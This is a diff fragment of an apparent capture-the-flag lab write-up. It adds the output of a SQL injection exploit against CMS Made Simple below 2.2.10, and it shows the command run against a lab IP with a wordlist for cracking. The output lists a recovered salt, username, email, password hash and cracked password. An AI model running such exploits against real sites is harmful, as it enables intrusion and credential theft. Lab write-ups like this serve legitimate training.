@@ -61,6 +61,14 @@ CMS Made Simple < 2.2.10 - SQL Injection                                        
 #### run script on target:
 `python2 exploit.py -u http://10.10.90.196/simple --crack -w /usr/share/wordlists/rockyou.txt`
 
+```
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+```
+
 
 ---
 #### Key:
